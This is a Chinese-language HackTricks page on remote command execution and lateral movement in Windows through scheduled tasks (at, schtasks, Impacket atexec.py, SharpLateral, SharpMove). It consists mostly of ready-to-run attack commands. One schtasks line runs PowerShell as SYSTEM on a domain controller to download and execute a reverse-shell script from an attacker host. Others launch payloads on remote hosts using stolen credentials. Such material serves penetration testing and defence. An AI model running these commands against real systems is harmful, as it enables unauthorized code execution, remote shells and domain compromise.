# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## 它是如何工作的

At 允许在你知道用户名和（密码/Hash）的主机上安排任务。因此，你可以利用它在其他主机中执行命令并获取输出。
```
At \\victim 11:00:00PM shutdown -r
```
使用 schtasks 时，首先需要创建任务，然后调用它：
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
你可以使用 **Impacket 的 `atexec.py`**，通过 AT 命令在远程系统上执行命令。这需要目标系统的有效凭据（用户名和密码或哈希）。
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
你也可以使用 [SharpLateral](https://github.com/mertdas/SharpLateral)：
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
你可以使用 [SharpMove](https://github.com/0xthirteen/SharpMove)：
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
有关此处使用 schtasks 配合 silver tickets 的[**更多信息**](../active-directory-methodology/silver-ticket.md#host)。

{{#include ../../banners/hacktricks-training.md}}
